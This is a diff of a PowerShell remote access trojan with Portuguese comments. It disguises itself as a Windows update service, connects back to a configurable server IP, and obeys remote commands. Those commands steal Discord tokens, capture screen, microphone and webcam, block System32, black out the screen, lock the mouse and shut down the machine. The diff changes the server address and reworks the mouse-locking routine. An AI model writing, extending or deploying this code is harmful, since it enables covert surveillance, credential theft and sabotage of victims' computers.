@@ -8,7 +8,7 @@ Version: 10.0.19045.1
 #>
 
 # ===== CONFIGURACOES =====
-$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
+$serverIP = "192.168.0.4"  # MUDE PARA SEU IP
 $serverPort = 4000
 $installName = "WinUpdateSvc"
 $mutexName = "Global\MicrosoftWindowsUpdateService"
@@ -290,7 +290,7 @@ function Unlock-Screen {
     }
 }
 
-# ===== TRAVAR MOUSE (SIMPLES E ROBUSTO) =====
+# ===== TRAVAR MOUSE (VERSÃO SIMPLES E ROBUSTA) =====
 $global:mouseLocked = $false
 $global:lockThread = $null
 
@@ -298,61 +298,21 @@ function Lock-Mouse {
     try {
         if ($global:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
         
-        # Método 1: Tenta usar ClipCursor via C#
-        $cSharpCode = @'
-using System;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
-public class MouseLocker {
-    [DllImport("user32.dll")]
-    public static extern bool ClipCursor(ref RECT lpRect);
-    
-    [StructLayout(LayoutKind.Sequential)]
-    public struct RECT {
-        public int left, top, right, bottom;
-    }
-    
-    public static void Lock() {
-        RECT rect = new RECT();
-        rect.left = 0;
-        rect.top = 0;
-        rect.right = 1;
-        rect.bottom = 1;
-        ClipCursor(ref rect);
-    }
-    
-    public static void Unlock() {
-        RECT rect = new RECT();
-        rect.left = 0;
-        rect.top = 0;
-        rect.right = Screen.PrimaryScreen.Bounds.Width;
-        rect.bottom = Screen.PrimaryScreen.Bounds.Height;
-        ClipCursor(ref rect);
-    }
-}
-'@
-        
-        # Tenta compilar e usar
-        try {
-            Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
-            [MouseLocker]::Lock()
-            $global:mouseLocked = $true
-            return "MOUSE_LOCKED"
-        } catch {
-            # Se falhar, usa o método de thread (movimento constante)
-            $global:mouseLocked = $true
-            $global:lockThread = [System.Threading.Thread]::new({
-                while ($global:mouseLocked) {
-                    try {
-                        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-                        Start-Sleep -Milliseconds 5
-                    } catch {}
+        $global:mouseLocked = $true
+        $global:lockThread = [System.Threading.Thread]::new({
+            while ($global:mouseLocked) {
+                try {
+                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
+                    Start-Sleep -Milliseconds 5
+                } catch {
+                    # Ignora erros
                 }
-            })
-            $global:lockThread.IsBackground = $true
-            $global:lockThread.Start()
-            return "MOUSE_LOCKED"
-        }
+            }
+        })
+        $global:lockThread.IsBackground = $true
+        $global:lockThread.Start()
+        
+        return "MOUSE_LOCKED"
     } catch {
         return "MOUSE_ERROR"
     }
@@ -361,17 +321,9 @@ public class MouseLocker {
 function Unlock-Mouse {
     try {
         $global:mouseLocked = $false
-        
-        # Tenta liberar via C#
-        try {
-            [MouseLocker]::Unlock()
-        } catch {}
-        
-        # Para a thread se existir
         if ($global:lockThread -and $global:lockThread.IsAlive) {
             $global:lockThread.Abort()
         }
-        
         return "MOUSE_UNLOCKED"
     } catch {
         return "UNLOCK_ERROR"
@@ -465,26 +417,26 @@ while ($true) {
             $cmd = $reader.ReadLine()
             if ([string]::IsNullOrEmpty($cmd)) { continue }
             
-            # Switch explícito sem wildcards
+            # Switch explícito sem wildcards para evitar confusão
             switch ($cmd) {
                 "screenshot"          { $writer.WriteLine((Get-ScreenCapture)) }
                 "click"               { $writer.WriteLine((Click-Mouse)) }
                 "rightclick"          { $writer.WriteLine((RightClick-Mouse)) }
                 "discord"             { $writer.WriteLine((Get-DiscordToken)) }
-                "block_system32"       { $writer.WriteLine((Block-System32)) }
-                "black_screen"         { $writer.WriteLine((Black-Screen)) }
-                "unlock_screen"        { $writer.WriteLine((Unlock-Screen)) }
-                "lock_mouse"           { $writer.WriteLine((Lock-Mouse)) }
-                "unlock_mouse"         { $writer.WriteLine((Unlock-Mouse)) }
-                "mic"                  { $writer.WriteLine((Get-Microphone)) }
-                "webcam"               { $writer.WriteLine((Get-Webcam)) }
-                "processes"            { $writer.WriteLine((Get-ProcessList)) }
-                "shutdown"             { $writer.WriteLine((Power-Control "shutdown")) }
-                "reboot"               { $writer.WriteLine((Power-Control "reboot")) }
-                "list_users"           { $writer.WriteLine((Get-RATUsers)) }
-                "remove_current_user"  { $writer.WriteLine((Remove-UserFromRAT $currentUser)) }
-                "test"                 { $writer.WriteLine("PONG") }
-                "exit"                 { break }
+                "block_system32"      { $writer.WriteLine((Block-System32)) }
+                "black_screen"        { $writer.WriteLine((Black-Screen)) }
+                "unlock_screen"       { $writer.WriteLine((Unlock-Screen)) }
+                "lock_mouse"          { $writer.WriteLine((Lock-Mouse)) }
+                "unlock_mouse"        { $writer.WriteLine((Unlock-Mouse)) }
+                "mic"                 { $writer.WriteLine((Get-Microphone)) }
+                "webcam"              { $writer.WriteLine((Get-Webcam)) }
+                "processes"           { $writer.WriteLine((Get-ProcessList)) }
+                "shutdown"            { $writer.WriteLine((Power-Control "shutdown")) }
+                "reboot"              { $writer.WriteLine((Power-Control "reboot")) }
+                "list_users"          { $writer.WriteLine((Get-RATUsers)) }
+                "remove_current_user" { $writer.WriteLine((Remove-UserFromRAT $currentUser)) }
+                "test"                { $writer.WriteLine("PONG") }
+                "exit"                { break }
                 default {
                     # Comandos com parâmetros usando regex
                     if ($cmd -match "^move (\d+) (\d+)$") {
